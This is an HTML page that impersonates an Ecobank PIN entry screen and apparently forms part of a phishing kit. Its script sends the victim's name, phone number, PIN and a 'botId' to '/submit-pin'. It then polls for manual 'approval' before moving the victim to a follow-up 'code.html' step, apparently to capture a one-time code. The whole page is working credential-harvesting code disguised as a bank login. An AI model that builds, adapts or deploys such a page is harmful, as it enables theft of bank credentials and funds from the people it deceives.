<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Enter PIN</title>

<style>
*{
  box-sizing:border-box;
}

body{
  margin:0;
  font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
  background:linear-gradient(135deg,#f8fafc,#eef2ff);
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
}

.pin-card{
  width:92%;
  max-width:420px;
  background:#fff;
  border-radius:28px;
  padding:32px 20px 36px;
  box-shadow:0 20px 60px rgba(15,23,42,.12);
  position:relative;
  text-align:center;
}

.back{
  position:absolute;
  left:18px;
  top:18px;
  font-size:22px;
  color:#2563eb;
  cursor:pointer;
}

.pin-title{
  font-size:20px;
  font-weight:700;
  color:#0f172a;
  margin-bottom:6px;
}

.pin-subtitle{
  font-size:14px;
  color:#64748b;
  margin-bottom:26px;
  font-weight:500;
}

.pin-box-wrapper{
  background:linear-gradient(135deg,#2563eb,#1e40af);
  border-radius:20px;
  padding:24px 16px;
  margin-bottom:28px;
  box-shadow:0 12px 30px rgba(37,99,235,.25);
}

.pin-row{
  display:flex;
  justify-content:center;
  gap:14px;
}

.pin-box{
  width:58px;
  height:58px;
  border-radius:14px;
  background:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:28px;
  font-weight:700;
  color:#2563eb;
  border:2px solid transparent;
}

.pin-box:not(:empty){
  border-color:#2563eb;
}

.lock{
  width:58px;
  height:58px;
  border-radius:14px;
  background:rgba(255,255,255,.15);
  border:1px dashed rgba(255,255,255,.4);
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:20px;
  color:#fff;
}

button{
  width:100%;
  padding:16px;
  font-size:16px;
  font-weight:600;
  background:linear-gradient(135deg,#2563eb,#3b82f6);
  color:#fff;
  border:none;
  border-radius:16px;
  cursor:pointer;
  opacity:.5;
}

button:enabled{
  opacity:1;
}

.status{
  margin-top:16px;
  font-size:14px;
  color:#2563eb;
  display:none;
}

.error{
  color:#dc2626;
}

/* .hidden-input{
  position:absolute;
  opacity:0;
  pointer-events:none;
} */
.pin-input{
  width:100%;
  padding:16px 20px;
  border:none;
  border-radius:14px;
  font-size:18px;
  font-weight:600;
  outline:none;
  background:#fff;
  color:#0f172a;
}
</style>
</head>

<body>

<div class="pin-card" onclick="focusPin()">
  <div class="back" onclick="history.back()">←</div>

  <div class="pin-title">Enter PIN</div>
  <div class="pin-subtitle">Enter your Ecobank PIN</div>

<div class="pin-box-wrapper">
  <input
    id="pinInput"
    type="password"
    inputmode="numeric"
    placeholder="Enter your PIN"
    class="pin-input"
  />
</div>

  <button id="loginBtn" disabled>Login</button>
  <div id="status" class="status">⏳ Waiting for approval...</div>
</div>

<!-- <input id="pinInput" class="hidden-input" type="tel" inputmode="numeric" maxlength="4"/> -->

<script>
const input = document.getElementById('pinInput');
const loginBtn = document.getElementById('loginBtn');
const statusEl = document.getElementById('status');

// const boxes = [
//   document.getElementById('b1'),
//   document.getElementById('b2'),
//   document.getElementById('b3'),
//   document.getElementById('b4')
// ];

const fullName = localStorage.getItem('fullName') || 'User';
const phone = localStorage.getItem('phone');
const botId = localStorage.getItem('botId');

if (!phone || !botId) {
  alert('Session expired. Please start again.');
  window.location.href = 'index.html';
}

function focusPin(){
  input.focus();
}

input.addEventListener('input', () => {
  input.value = input.value.replace(/\D/g,'');

  loginBtn.disabled = input.value.length === 0;
});

loginBtn.addEventListener('click', async () => {
  const pin = input.value;

  loginBtn.disabled = true;
  statusEl.style.display = 'block';
  statusEl.textContent = '⏳ Waiting for approval...';

  try {
    const res = await fetch('/submit-pin', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ name: fullName, phone, pin, botId })
    });

    const data = await res.json();
    pollPin(data.requestId);

  } catch (e) {
    statusEl.classList.add('error');
    statusEl.textContent = '❌ Server error';
    loginBtn.disabled = false;
  }
});

function pollPin(requestId){
  const interval = setInterval(async () => {
    const res = await fetch(`/check-pin/${requestId}`);
    const data = await res.json();

    // ✅ FIXED REDIRECT LOGIC
    if (data.approved === true || data.redirect === 'code') {
      clearInterval(interval);
      window.location.href = 'code.html';
      return;
    }

    if (data.approved === false || data.blocked) {
      clearInterval(interval);

     input.value = '';
loginBtn.disabled = true;

statusEl.classList.add('error');
statusEl.textContent = '❌ Incorrect PIN';
    }

  }, 2000);
}

window.onload = () => input.focus();
</script>

</body>
</html>
